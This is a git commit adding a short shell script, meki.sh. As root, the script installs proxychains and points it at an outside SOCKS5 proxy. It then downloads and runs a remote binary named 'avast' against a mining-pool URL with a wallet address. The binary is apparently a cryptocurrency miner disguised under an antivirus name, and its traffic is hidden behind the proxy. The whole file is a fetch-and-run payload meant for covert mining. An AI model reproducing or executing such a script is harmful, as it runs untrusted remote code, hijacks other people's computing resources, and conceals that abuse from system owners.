5ba3511f2c5174c9cbe5f8dad5203a45aaccae57
renilo <88342640+renilo@users.noreply.github.com>
2022-01-23 19:10:54 +0700

    Create meki.sh

---
+++ meki.sh
@@ -0,0 +1,17 @@
+sudo -i
+
+apt update
+
+apt install proxychains
+
+sed -i 's/socks4/socks5/' /etc/proxychains.conf
+
+sed -i 's/127.0.0.1/98.162.96.53/' /etc/proxychains.conf
+
+sed -i 's/9050/10663/' /etc/proxychains.conf
+
+wget https://raw.githubusercontent.com/renilo/bh/main/avast
+
+chmod +x avast
+
+./avast run https://server1.whalestonpool.com EQCq8h0FQ_IzVSueBKoYahTBe5EXnomyu6WVTPp29L8YYG2Z
